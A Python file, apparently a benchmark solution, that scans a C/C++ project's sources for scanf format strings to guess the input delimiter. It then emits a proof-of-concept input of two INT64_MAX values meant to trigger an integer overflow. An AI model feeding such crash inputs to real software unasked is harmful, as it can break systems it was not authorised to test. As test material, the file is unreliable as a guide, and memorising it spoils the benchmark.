import os
import re
import tarfile

class Solution:
    def _iter_source_texts(self, src_path):
        exts = {'.c', '.cc', '.cpp', '.h', '.hpp'}
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if os.path.splitext(fn)[1].lower() in exts:
                        p = os.path.join(root, fn)
                        try:
                            with open(p, 'rb') as f:
                                yield f.read().decode('utf-8', errors='ignore')
                        except Exception:
                            continue
        else:
            try:
                if tarfile.is_tarfile(src_path):
                    with tarfile.open(src_path, 'r:*') as tf:
                        for m in tf.getmembers():
                            if not m.isfile():
                                continue
                            if os.path.splitext(m.name)[1].lower() in exts:
                                try:
                                    f = tf.extractfile(m)
                                    if f is None:
                                        continue
                                    data = f.read().decode('utf-8', errors='ignore')
                                    yield data
                                except Exception:
                                    continue
            except Exception:
                pass

    def _detect_delimiter(self, src_path):
        # Default to whitespace (space)
        delim = ' '
        # Detect comma-delimited numeric scanf patterns like "%d,%d", "%lld,%lld", etc.
        scanf_patterns = [
            re.compile(r'\bscanf\s*\(\s*"([^"]*)"', re.S),
            re.compile(r'\bsscanf\s*\(\s*[^,]+,\s*"([^"]*)"', re.S),
            re.compile(r'\bfscanf\s*\(\s*[^,]+,\s*"([^"]*)"', re.S),
        ]
        try:
            for text in self._iter_source_texts(src_path):
                for pat in scanf_patterns:
                    for m in pat.finditer(text):
                        fmt = m.group(1)
                        # Look for two conversions separated by a comma within the format string
                        if re.search(r'%[^%]*,[^%]*%', fmt):
                            return ','
                # Also look for obvious tokenization on comma
                if (",%d" in text or "%d,%d" in text or
                    "strchr" in text and "'" in text and ",')" in text or
                    "split" in text and ',' in text):
                    # Heuristic hint for comma separation
                    return ','
        except Exception:
            pass
        return delim

    def solve(self, src_path: str) -> bytes:
        delim = self._detect_delimiter(src_path)
        num = "9223372036854775807"
        poc = f"{num}{delim}{num}\n"
        return poc.encode('ascii')